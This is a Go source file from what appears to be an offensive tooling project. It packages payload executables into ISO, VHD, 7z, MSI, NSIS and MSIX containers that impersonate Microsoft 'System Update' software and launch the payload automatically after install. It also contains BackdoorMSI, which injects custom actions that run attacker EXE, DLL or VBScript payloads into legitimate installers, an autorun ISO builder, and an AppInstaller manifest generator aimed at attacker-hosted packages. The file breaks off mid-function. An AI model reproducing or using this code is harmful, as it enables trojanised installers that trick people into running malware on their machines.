package peutils

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var SevenZipPassword string
var MSIAppName string
var MSIManufacturer string
var MSIScope string

func PackageOutput(format string, files []string, baseName string) {
	if format == "none" || format == "" {
		return
	}
	switch format {
	case "zip":
		packageZip(files, baseName+".zip")
	case "iso":
		packageISO(files, baseName+".iso")
	case "img":
		packageIMG(files, baseName+".img")
	case "vhd":
		packageVHD(files, baseName+".vhd")
	case "7z":
		if SevenZipPassword != "" {
			Package7zWithPassword(files, baseName+".7z", SevenZipPassword)
		} else {
			package7z(files, baseName+".7z")
		}
	case "msi":
		if MSIAppName != "" || MSIManufacturer != "" || MSIScope != "" {
			appName := MSIAppName
			if appName == "" {
				appName = "System Update"
			}
			mfr := MSIManufacturer
			if mfr == "" {
				mfr = "Microsoft Corporation"
			}
			scope := MSIScope
			if scope == "" {
				scope = "user"
			}
			PackageMSIWithOptions(files, baseName+".msi", appName, mfr, scope)
		} else {
			packageMSI(files, baseName+".msi")
		}
	case "electron":
		packageElectron(files, baseName)
	case "msix":
		packageMSIX(files, baseName)
	default:
		log.Fatalf("Error: unsupported package format %q", format)
	}
}

func packageZip(files []string, outPath string) {
	f, err := os.Create(outPath)
	if err != nil {
		log.Fatalf("Error creating zip: %s", err)
	}
	defer f.Close()
	w := zip.NewWriter(f)
	defer w.Close()

	for _, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			log.Fatalf("Error reading %s for zip: %s", path, err)
		}
		header := &zip.FileHeader{
			Name:     filepath.Base(path),
			Method:   zip.Deflate,
			Modified: time.Now(),
		}
		writer, err := w.CreateHeader(header)
		if err != nil {
			log.Fatalf("Error adding %s to zip: %s", path, err)
		}
		if _, err := writer.Write(data); err != nil {
			log.Fatalf("Error writing %s to zip: %s", path, err)
		}
	}
	w.Close()
	f.Close()

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as ZIP: " + outPath)
	Sha256(outPath)
}

func packageISO(files []string, outPath string) {
	bin, err := exec.LookPath("genisoimage")
	if err != nil {
		bin, err = exec.LookPath("mkisofs")
		if err != nil {
			log.Fatal("Error: genisoimage/mkisofs not found. Install with: apt install genisoimage")
		}
	}

	tmpDir, err := os.MkdirTemp("", "erlikhan-iso-*")
	if err != nil {
		log.Fatalf("Error creating temp dir for ISO: %s", err)
	}
	defer os.RemoveAll(tmpDir)

	for _, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			log.Fatalf("Error reading %s for ISO: %s", path, err)
		}
		if err := os.WriteFile(filepath.Join(tmpDir, filepath.Base(path)), data, 0644); err != nil {
			log.Fatalf("Error staging %s for ISO: %s", path, err)
		}
	}

	cmd := exec.Command(bin,
		"-o", outPath,
		"-J",
		"-joliet-long",
		"-r",
		"-hide-joliet-trans-tbl",
		"-V", "DATA",
		tmpDir,
	)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("ISO creation failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as ISO: " + outPath)
	Sha256(outPath)
}

func packageIMG(files []string, outPath string) {
	for _, tool := range []string{"mkfs.fat", "mcopy"} {
		if _, err := exec.LookPath(tool); err != nil {
			log.Fatalf("Error: %s not found. Install with: apt install dosfstools mtools", tool)
		}
	}

	var totalSize int64
	for _, path := range files {
		st, err := os.Stat(path)
		if err != nil {
			log.Fatalf("Error stating %s: %s", path, err)
		}
		totalSize += st.Size()
	}
	imgSize := totalSize + 1024*1024
	if imgSize < 2*1024*1024 {
		imgSize = 2 * 1024 * 1024
	}

	img, err := os.Create(outPath)
	if err != nil {
		log.Fatalf("Error creating IMG: %s", err)
	}
	if err := img.Truncate(imgSize); err != nil {
		img.Close()
		log.Fatalf("Error sizing IMG: %s", err)
	}
	img.Close()

	cmd := exec.Command("mkfs.fat", "-F", "12", outPath)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("mkfs.fat failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		cmd := exec.Command("mcopy", "-i", outPath, path, "::"+filepath.Base(path))
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			log.Fatalf("mcopy failed for %s: %s\n%s", path, err, stderr.String())
		}
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as IMG: " + outPath)
	Sha256(outPath)
}

func packageVHD(files []string, outPath string) {
	for _, tool := range []string{"mkfs.fat", "mcopy"} {
		if _, err := exec.LookPath(tool); err != nil {
			log.Fatalf("Error: %s not found. Install with: apt install dosfstools mtools", tool)
		}
	}

	var totalSize int64
	for _, path := range files {
		st, err := os.Stat(path)
		if err != nil {
			log.Fatalf("Error stating %s: %s", path, err)
		}
		totalSize += st.Size()
	}
	rawSize := totalSize + 1024*1024
	if rawSize < 2*1024*1024 {
		rawSize = 2 * 1024 * 1024
	}
	sectorSize := int64(512)
	rawSize = ((rawSize + sectorSize - 1) / sectorSize) * sectorSize

	f, err := os.Create(outPath)
	if err != nil {
		log.Fatalf("Error creating VHD: %s", err)
	}
	if err := f.Truncate(rawSize); err != nil {
		f.Close()
		log.Fatalf("Error sizing VHD: %s", err)
	}
	f.Close()

	cmd := exec.Command("mkfs.fat", "-F", "12", outPath)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("mkfs.fat failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		cmd := exec.Command("mcopy", "-i", outPath, path, "::"+filepath.Base(path))
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			log.Fatalf("mcopy failed for %s: %s\n%s", path, err, stderr.String())
		}
	}

	f, err = os.OpenFile(outPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Error reopening VHD: %s", err)
	}
	defer f.Close()
	footer := buildVHDFooter(rawSize)
	if _, err := f.Write(footer); err != nil {
		log.Fatalf("Error writing VHD footer: %s", err)
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as VHD: " + outPath)
	Sha256(outPath)
}

func buildVHDFooter(diskSize int64) []byte {
	footer := make([]byte, 512)

	copy(footer[0:8], []byte("conectix"))

	binary.BigEndian.PutUint32(footer[8:12], 0x00000002)

	binary.BigEndian.PutUint16(footer[12:14], 0x0001)
	binary.BigEndian.PutUint16(footer[14:16], 0x0000)

	binary.BigEndian.PutUint32(footer[16:20], 0x00000002)

	binary.BigEndian.PutUint64(footer[20:28], 0xFFFFFFFFFFFFFFFF)

	now := time.Now().UTC()
	epoch := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)
	binary.BigEndian.PutUint32(footer[28:32], uint32(now.Sub(epoch).Seconds()))

	copy(footer[32:36], []byte("sccw"))

	binary.BigEndian.PutUint16(footer[36:38], 0x0001)
	binary.BigEndian.PutUint16(footer[38:40], 0x0000)

	copy(footer[40:44], []byte("Wi2k"))

	binary.BigEndian.PutUint64(footer[44:52], uint64(diskSize))
	binary.BigEndian.PutUint64(footer[52:60], uint64(diskSize))

	cylinders, heads, sectors := calcCHS(diskSize)
	binary.BigEndian.PutUint16(footer[60:62], cylinders)
	footer[62] = heads
	footer[63] = sectors

	binary.BigEndian.PutUint32(footer[64:68], 0x00000002)

	var checksum uint32
	for i := 0; i < 512; i++ {
		checksum += uint32(footer[i])
	}
	binary.BigEndian.PutUint32(footer[68:72], ^checksum)

	return footer
}

func calcCHS(diskSize int64) (uint16, byte, byte) {
	totalSectors := diskSize / 512
	if totalSectors > 65535*16*255 {
		totalSectors = 65535 * 16 * 255
	}
	var cylinders, heads, sectors int64
	if totalSectors >= 65535*16*63 {
		sectors = 255
		heads = 16
		cylinders = totalSectors / (heads * sectors)
	} else {
		sectors = 17
		cylinders = totalSectors / sectors
		heads = (cylinders + 1023) / 1024
		if heads < 4 {
			heads = 4
		}
		if cylinders >= heads*(1024) || heads > 16 {
			sectors = 31
			heads = 16
			cylinders = totalSectors / (heads * sectors)
		}
		if cylinders >= heads*(1024) {
			sectors = 63
			heads = 16
			cylinders = totalSectors / (heads * sectors)
		}
	}
	if cylinders > 65535 {
		cylinders = 65535
	}
	return uint16(cylinders), byte(heads), byte(sectors)
}

func package7z(files []string, outPath string) {
	bin, err := exec.LookPath("7z")
	if err != nil {
		log.Fatal("Error: 7z not found. Install with: apt install p7zip-full")
	}

	args := []string{"a", "-t7z", "-mx=9", outPath}
	args = append(args, files...)

	cmd := exec.Command(bin, args...)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("7z creation failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as 7z: " + outPath)
	Sha256(outPath)
}

func Package7zWithPassword(files []string, outPath, password string) {
	bin, err := exec.LookPath("7z")
	if err != nil {
		log.Fatal("Error: 7z not found. Install with: apt install p7zip-full")
	}

	args := []string{"a", "-t7z", "-mx=9", "-p" + password, "-mhe=on", outPath}
	args = append(args, files...)

	cmd := exec.Command(bin, args...)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("7z creation failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as password-protected 7z: " + outPath)
	Sha256(outPath)
}

func packageMSI(files []string, outPath string) {
	if _, err := exec.LookPath("wixl"); err != nil {
		log.Fatal("Error: wixl not found. Install with: apt install msitools")
	}

	tmpDir, err := os.MkdirTemp("", "erlikhan-msi-*")
	if err != nil {
		log.Fatalf("Error creating temp dir for MSI: %s", err)
	}
	defer os.RemoveAll(tmpDir)

	var mainExe string
	var extraFiles []string
	for _, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			log.Fatalf("Error reading %s for MSI: %s", path, err)
		}
		staged := filepath.Join(tmpDir, filepath.Base(path))
		if err := os.WriteFile(staged, data, 0644); err != nil {
			log.Fatalf("Error staging %s for MSI: %s", path, err)
		}
		if strings.HasSuffix(strings.ToLower(path), ".exe") && mainExe == "" {
			mainExe = staged
		} else {
			extraFiles = append(extraFiles, staged)
		}
	}

	if mainExe == "" {
		if len(files) > 0 {
			mainExe = filepath.Join(tmpDir, filepath.Base(files[0]))
		} else {
			log.Fatal("Error: no files to package into MSI")
		}
	}

	filesXML := fmt.Sprintf(`<File Id="PayloadEXE" Source="%s" />`, mainExe)
	for i, f := range extraFiles {
		filesXML += fmt.Sprintf("\n                        "+`<File Id="ExtraFile%d" Source="%s" />`, i, f)
	}

	wxsContent := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
             Name="System Update" Version="1.0.0" Manufacturer="Microsoft Corporation" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser" />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="LocalAppDataFolder">
                <Directory Id="INSTALLDIR" Name="SystemUpdate">
                    <Component Id="MainComponent" Guid="*">
                        <RegistryValue Root="HKCU" Key="Software\Microsoft\SystemUpdate"
                                       Name="installed" Type="integer" Value="1" KeyPath="yes"/>
                        %s
                    </Component>
                </Directory>
            </Directory>
        </Directory>
        <Feature Id="ProductFeature" Title="System Update" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>
        <CustomAction Id="LaunchApp" FileKey="PayloadEXE" ExeCommand="" Return="asyncNoWait" />
        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize">NOT Installed</Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>`, filesXML)

	wxsPath := filepath.Join(tmpDir, "installer.wxs")
	if err := os.WriteFile(wxsPath, []byte(wxsContent), 0644); err != nil {
		log.Fatalf("Error writing WXS: %s", err)
	}

	cmd := exec.Command("wixl", "-o", outPath, wxsPath)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("MSI creation failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as MSI: " + outPath)
	Sha256(outPath)
}

// PackageMSIWithOptions creates an MSI with custom product name and manufacturer.
func PackageMSIWithOptions(files []string, outPath, appName, manufacturer, scope string) {
	if _, err := exec.LookPath("wixl"); err != nil {
		log.Fatal("Error: wixl not found. Install with: apt install msitools")
	}

	tmpDir, err := os.MkdirTemp("", "erlikhan-msi-*")
	if err != nil {
		log.Fatalf("Error creating temp dir for MSI: %s", err)
	}
	defer os.RemoveAll(tmpDir)

	targetDir := "LocalAppDataFolder"
	installScope := "perUser"
	if strings.EqualFold(scope, "machine") {
		targetDir = "ProgramFilesFolder"
		installScope = "perMachine"
	}

	var mainExe string
	var filesXML string
	for i, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			log.Fatalf("Error reading %s for MSI: %s", path, err)
		}
		staged := filepath.Join(tmpDir, filepath.Base(path))
		if err := os.WriteFile(staged, data, 0644); err != nil {
			log.Fatalf("Error staging %s for MSI: %s", path, err)
		}
		fileID := fmt.Sprintf("File%d", i)
		if strings.HasSuffix(strings.ToLower(path), ".exe") && mainExe == "" {
			fileID = "PayloadEXE"
			mainExe = staged
		}
		filesXML += fmt.Sprintf(`<File Id="%s" Source="%s" />`+"\n                        ", fileID, staged)
	}

	wxsContent := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
             Name="%s" Version="1.0.0" Manufacturer="%s" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" InstallScope="%s" />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="%s">
                <Directory Id="INSTALLDIR" Name="%s">
                    <Component Id="MainComponent" Guid="*">
                        <RegistryValue Root="HKCU" Key="Software\%s\%s"
                                       Name="installed" Type="integer" Value="1" KeyPath="yes"/>
                        %s
                    </Component>
                </Directory>
            </Directory>
        </Directory>
        <Feature Id="ProductFeature" Title="%s" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>
        <CustomAction Id="LaunchApp" FileKey="PayloadEXE" ExeCommand="" Return="asyncNoWait" />
        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize">NOT Installed</Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>`, appName, manufacturer, installScope, targetDir, appName,
		manufacturer, appName, filesXML, appName)

	wxsPath := filepath.Join(tmpDir, "installer.wxs")
	if err := os.WriteFile(wxsPath, []byte(wxsContent), 0644); err != nil {
		log.Fatalf("Error writing WXS: %s", err)
	}

	cmd := exec.Command("wixl", "-o", outPath, wxsPath)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("MSI creation failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as MSI: " + outPath)
	Sha256(outPath)
}

// BackdoorMSI injects a CustomAction into an existing MSI installer.
// attackVector: "execute" (EXE, type 34), "run-exe" (EXE+args, type 2),
// "load-dll" (DLL entry point, type 1), "dotnet" (.NET DLL, type 65),
// "script" (VBScript, type 6). vectorArgs provides extra context per vector.
func BackdoorMSI(sourceMSI, payloadPath, outPath, attackVector, vectorArgs string) {
	for _, tool := range []string{"msiinfo", "msibuild", "msiextract"} {
		if _, err := exec.LookPath(tool); err != nil {
			log.Fatalf("Error: %s not found. Install with: apt install msitools", tool)
		}
	}

	data, err := os.ReadFile(sourceMSI)
	if err != nil {
		log.Fatalf("Error reading source MSI: %s", err)
	}
	if err := os.WriteFile(outPath, data, 0644); err != nil {
		log.Fatalf("Error copying MSI: %s", err)
	}

	tmpDir, err := os.MkdirTemp("", "erlikhan-msi-inject-*")
	if err != nil {
		log.Fatalf("Error creating temp dir: %s", err)
	}
	defer os.RemoveAll(tmpDir)

	binaryName := "Payload_" + strings.Replace(filepath.Base(payloadPath), ".", "_", -1)
	actionName := "ErlikhanAction"

	var actionType int
	var target string
	switch attackVector {
	case "run-exe":
		actionType = 2
		target = vectorArgs
	case "load-dll":
		actionType = 1
		if vectorArgs != "" {
			target = vectorArgs
		} else {
			target = "DllRegisterServer"
		}
	case "dotnet":
		actionType = 65
		target = vectorArgs
	case "script":
		actionType = 6
		target = ""
	default:
		actionType = 34
		target = ""
	}

	tablesDir := filepath.Join(tmpDir, "tables")
	os.MkdirAll(tablesDir, 0755)

	// Export existing tables
	tablesOut, err := exec.Command("msiinfo", "tables", outPath).Output()
	if err == nil {
		for _, table := range strings.Split(strings.TrimSpace(string(tablesOut)), "\n") {
			table = strings.TrimSpace(table)
			if table == "" {
				continue
			}
			tableData, err := exec.Command("msiinfo", "export", outPath, table).Output()
			if err == nil {
				os.WriteFile(filepath.Join(tablesDir, table+".idt"), tableData, 0644)
			}
		}
	}

	// Add/modify CustomAction table
	caPath := filepath.Join(tablesDir, "CustomAction.idt")
	caContent := "Action\tType\tSource\tTarget\ns72\ti2\tS64\tS0\nCustomAction\tAction\n"
	if existing, err := os.ReadFile(caPath); err == nil {
		caContent = string(existing)
	}
	caContent += fmt.Sprintf("%s\t%d\t%s\t%s\n", actionName, actionType, binaryName, target)
	os.WriteFile(caPath, []byte(caContent), 0644)

	// Add to InstallExecuteSequence
	iesPath := filepath.Join(tablesDir, "InstallExecuteSequence.idt")
	iesContent := "Action\tCondition\tSequence\ns72\tS255\tI2\nInstallExecuteSequence\tAction\n"
	if existing, err := os.ReadFile(iesPath); err == nil {
		iesContent = string(existing)
	}
	iesContent += fmt.Sprintf("%s\tNOT REMOVE\t6599\n", actionName)
	os.WriteFile(iesPath, []byte(iesContent), 0644)

	// Build the backdoored MSI
	args := []string{outPath}
	for _, f := range []string{"CustomAction.idt", "InstallExecuteSequence.idt"} {
		p := filepath.Join(tablesDir, f)
		if _, err := os.Stat(p); err == nil {
			args = append(args, "-i", p)
		}
	}
	if attackVector == "script" {
		vbsContent := fmt.Sprintf("Set ws = CreateObject(\"WScript.Shell\")\nws.Run \"%s\", 0, False\n", filepath.Base(payloadPath))
		vbsPath := filepath.Join(tmpDir, "launch.vbs")
		os.WriteFile(vbsPath, []byte(vbsContent), 0644)
		args = append(args, "-a", "Binary."+binaryName, vbsPath)
		// Also embed the payload as a separate binary entry
		payloadBinName := "PayloadBin_" + strings.Replace(filepath.Base(payloadPath), ".", "_", -1)
		args = append(args, "-a", "Binary."+payloadBinName, payloadPath)
	} else {
		args = append(args, "-a", "Binary."+binaryName, payloadPath)
	}

	cmd := exec.Command("msibuild", args...)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("MSI backdooring failed: %s\n%s", err, stderr.String())
	}

	fmt.Printf("[+] MSI backdoored: %s -> %s\n", sourceMSI, outPath)
	Sha256(outPath)
}

// PackageISOWithAutorun creates an ISO with autorun.inf.
func PackageISOWithAutorun(files []string, outPath, autorunExe string) {
	bin, err := exec.LookPath("genisoimage")
	if err != nil {
		bin, err = exec.LookPath("mkisofs")
		if err != nil {
			log.Fatal("Error: genisoimage/mkisofs not found. Install with: apt install genisoimage")
		}
	}

	tmpDir, err := os.MkdirTemp("", "erlikhan-iso-*")
	if err != nil {
		log.Fatalf("Error creating temp dir for ISO: %s", err)
	}
	defer os.RemoveAll(tmpDir)

	for _, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			log.Fatalf("Error reading %s for ISO: %s", path, err)
		}
		if err := os.WriteFile(filepath.Join(tmpDir, filepath.Base(path)), data, 0644); err != nil {
			log.Fatalf("Error staging %s for ISO: %s", path, err)
		}
	}

	autorunContent := fmt.Sprintf("[AutoRun]\nopen=%s\naction=Open folder to view files\nicon=%%SystemRoot%%\\system32\\SHELL32.dll,4\n", autorunExe)
	if err := os.WriteFile(filepath.Join(tmpDir, "autorun.inf"), []byte(autorunContent), 0644); err != nil {
		log.Fatalf("Error writing autorun.inf: %s", err)
	}

	cmd := exec.Command(bin,
		"-o", outPath,
		"-J",
		"-joliet-long",
		"-r",
		"-hide-joliet-trans-tbl",
		"-V", "DATA",
		tmpDir,
	)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("ISO creation failed: %s\n%s", err, stderr.String())
	}

	for _, path := range files {
		os.Remove(path)
	}
	fmt.Println("[+] Packaged as ISO with autorun: " + outPath)
	Sha256(outPath)
}

func ValidPackageFormats() []string {
	return []string{"none", "zip", "iso", "img", "vhd", "7z", "msi", "electron", "msix"}
}

func IsValidPackageFormat(format string) bool {
	for _, f := range ValidPackageFormats() {
		if strings.EqualFold(format, f) {
			return true
		}
	}
	return false
}

func OutputFilesForMode(mode, name, outFile, lolbin string) []string {
	if lolbin != "" {
		return []string{name + ".exe"}
	}
	switch mode {
	case "binary":
		return []string{name + ".exe"}
	case "dll":
		return []string{name + ".dll"}
	case "service":
		return []string{name + ".dll"}
	case "control":
		if outFile == "" {
			return []string{name + ".cpl"}
		}
		return []string{outFile}
	default:
		return []string{outFile}
	}
}

func PackageBaseName(files []string) string {
	if len(files) == 0 {
		return "payload"
	}
	name := filepath.Base(files[0])
	ext := filepath.Ext(name)
	return strings.TrimSuffix(name, ext)
}

func MovePackageFile(packagePath, destPath string) {
	if destPath == "" {
		return
	}
	if !strings.HasSuffix(destPath, "/") {
		destPath = destPath + "/"
	}
	base := filepath.Base(packagePath)
	dest := destPath + base
	if err := os.MkdirAll(destPath, 0755); err != nil {
		fmt.Printf("Error creating %s: %s\n", destPath, err)
		return
	}
	if err := os.Rename(packagePath, dest); err != nil {
		data, rerr := os.ReadFile(packagePath)
		if rerr != nil {
			fmt.Printf("Error moving %s: %s\n", packagePath, err)
			return
		}
		if werr := os.WriteFile(dest, data, 0644); werr != nil {
			fmt.Printf("Error copying %s to %s: %s\n", packagePath, dest, werr)
			return
		}
		os.Remove(packagePath)
	}
	fmt.Println("[*] " + base + " moved to " + destPath)
}

// MovePackagedFiles handles post-packaging file movement. When packaging is
// active, the original payload files are already removed (packaged inside the
// container), so only the container itself needs to move. Without packaging,
// the original FileMover path in CompileLoader/CompileLolbin already ran.
func FinalPackageMove(format, baseName, path string) {
	if format == "none" || format == "" || path == "" {
		return
	}
	var ext string
	switch format {
	case "zip":
		ext = ".zip"
	case "iso":
		ext = ".iso"
	case "img":
		ext = ".img"
	case "vhd":
		ext = ".vhd"
	case "7z":
		ext = ".7z"
	case "msi":
		ext = ".msi"
	case "electron":
		ext = "-electron"
	case "msix":
		ext = "-msix"
	}
	packageFile := baseName + ext
	if _, err := os.Stat(packageFile); err == nil {
		MovePackageFile(packageFile, path)
	}
}

// SkipFileMover returns true when packaging is active, meaning CompileLoader
// should skip its internal FileMover call (packaging will handle the move).
func SkipFileMover(format string) bool {
	return format != "" && format != "none"
}

// GatherOutputFiles collects the output files that exist on disk for a given
// mode. This is called after CompileLoader/CompileLolbin when we know the
// files have been placed in cwd.
// packageElectron creates a fake Electron/NSIS installer project wrapping payload files.
func packageElectron(files []string, baseName string) {
	GenerateElectronInstaller(files, baseName+"-electron", "Setup", "Acme Corporation", "1.0.0")
}

// packageMSIX creates an MSIX package structure directory.
func packageMSIX(files []string, baseName string) {
	GenerateMSIXStructure(files, baseName+"-msix",
		"Microsoft.SystemUpdate", "CN=Microsoft Corporation",
		"1.0.0.0", "x64", "System Update", "System Update package")
}

// GenerateElectronInstaller creates a fake Electron/NSIS installer project.
// Produces an NSIS script (.nsi), staged payload files, and a build script.
// Requires makensis on PATH to compile the final installer EXE.
func GenerateElectronInstaller(payloadFiles []string, outDir, productName, publisher, version string) string {
	if productName == "" {
		productName = "Setup"
	}
	if publisher == "" {
		publisher = "Acme Corporation"
	}
	if version == "" {
		version = "1.0.0"
	}

	filesDir := filepath.Join(outDir, "files")
	os.MkdirAll(filesDir, 0755)

	var installEntries, uninstallEntries []string
	for _, path := range payloadFiles {
		data, err := os.ReadFile(path)
		if err != nil {
			log.Printf("Warning: cannot read %s for Electron installer: %s", path, err)
			continue
		}
		name := filepath.Base(path)
		if err := os.WriteFile(filepath.Join(filesDir, name), data, 0644); err != nil {
			log.Printf("Warning: cannot stage %s: %s", name, err)
			continue
		}
		installEntries = append(installEntries, fmt.Sprintf(`  File "/oname=%s" "files\%s"`, name, name))
		uninstallEntries = append(uninstallEntries, fmt.Sprintf(`  Delete "$INSTDIR\%s"`, name))
	}

	entryExe := "payload.exe"
	if len(payloadFiles) > 0 {
		entryExe = filepath.Base(payloadFiles[0])
	}

	nsi := fmt.Sprintf(`!include "MUI2.nsh"

Name "%s"
OutFile "%s_Setup.exe"
InstallDir "$TEMP\inst-$HWNDPARENT"
RequestExecutionLevel user
ShowInstDetails nevershow

!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_LANGUAGE "English"

Section "Install"
  SetOutPath $INSTDIR
%s

  ; Launch payload hidden and detached
  nsExec::ExecToLog '"$INSTDIR\%s"'
SectionEnd

Section "Uninstall"
%s
  RMDir "$INSTDIR"
SectionEnd
`, productName, productName,
		strings.Join(installEntries, "\n"),
		entryExe,
		strings.Join(uninstallEntries, "\n"))

	nsiPath := filepath.Join(outDir, productName+".nsi")
	if err := os.WriteFile(nsiPath, []byte(nsi), 0644); err != nil {
		log.Fatalf("Error writing NSIS script: %s", err)
	}

	buildScript := fmt.Sprintf("#!/bin/bash\n# Compile the NSIS installer. Requires: apt install nsis\nset -e\ncd \"$(dirname \"$0\")\"\nmakensis \"%s.nsi\"\necho \"[+] Installer created: %s_Setup.exe\"\n", productName, productName)
	if err := os.WriteFile(filepath.Join(outDir, "build_installer.sh"), []byte(buildScript), 0755); err != nil {
		log.Fatalf("Error writing build script: %s", err)
	}

	fmt.Println("[+] Electron/NSIS installer project created: " + outDir)
	return nsiPath
}

// GenerateAppInstaller creates an AppInstaller XML manifest pointing to an
// attacker-hosted MSIX package. No Windows tools required.
func GenerateAppInstaller(msixURI, outDir, outputFilename, packageName, publisherDN, version, arch string) string {
	if outputFilename == "" {
		outputFilename = "setup.appinstaller"
	}
	if packageName == "" {
		packageName = "Microsoft.WindowsUpdate"
	}
	if publisherDN == "" {
		publisherDN = "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
	}
	if version == "" {
		version = "1.0.0.0"
	}
	if arch == "" {
		arch = "x64"
	}

	appinstallerURI := msixURI
	if idx := strings.LastIndex(msixURI, "/"); idx >= 0 {
		appinstallerURI = msixURI[:idx+1] + outputFilename
	}

	os.MkdirAll(outDir, 0755)

	xml := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<AppInstaller
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2018"
    Version="%s"
    Uri="%s">

    <MainPackage
        Name="%s"
        Publisher="%s"
        Version="%s"
        Uri="%s"
        ProcessorArchitecture="%s" />

    <UpdateSettings>
        <OnLaunch
            HoursBetweenUpdateChecks="0"
            ShowPrompt="false"
            UpdateBlocksActivation="false" />
    </UpdateSettings>

</AppInstaller>`, version, appinstallerURI, packageName, publisherDN, version, msixURI, arch)

	outPath := filepath.Join(outDir, outputFilename)
	if err := os.WriteFile(outPath, []byte(xml), 0644); err != nil {
		log.Fatalf("Error writing AppInstaller manifest: %s", err)
	}

	fmt.Println("[+] AppInstaller manifest created: " + outPath)
	return outPath
}

// GenerateMSIXStructure creates an MSIX package directory with AppxManifest.xml,
// content types, payload assets, and a Windows build script for makeappx/signtool.
func GenerateMSIXStructure(payloadFiles []string, outDir, packageName, publisherDN, version, arch, displayName, description string) string {
	if packageName == "" {
		packageName = "Microsoft.SystemUpdate"
	}
	if publisherDN == "" {
		publisherDN = "CN=ErebusOperator"
	}
	if version == "" {
		version = "1.0.0.0"
	}
	if arch == "" {
		arch = "x64"
	}
	if displayName == "" {
		displayName = "System Update"
	}
	if description == "" {
		description = "System Update package"
	}

	assetsDir := filepath.Join(outDir, "assets")
	os.MkdirAll(assetsDir, 0755)

	entryExe := "payload.exe"
	for _, fp := range payloadFiles {
		data, err := os.ReadFile(fp)
		if err != nil {
			log.Printf("Warning: cannot read %s for MSIX: %s", fp, err)
			continue
		}
		name := filepath.Base(fp)
		os.WriteFile(filepath.Join(assetsDir, name), data, 0644)
		if entryExe == "payload.exe" && strings.HasSuffix(strings.ToLower(name), ".exe") {
			entryExe = name
		}
	}

	// 1x1 transparent PNG placeholder logo
	logoPNG := []byte{
		0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D,
		0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
		0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89, 0x00, 0x00, 0x00,
		0x0A, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
		0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x49,
		0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
	}
	os.WriteFile(filepath.Join(assetsDir, "logo.png"), logoPNG, 0644)

	publisherShort := publisherDN
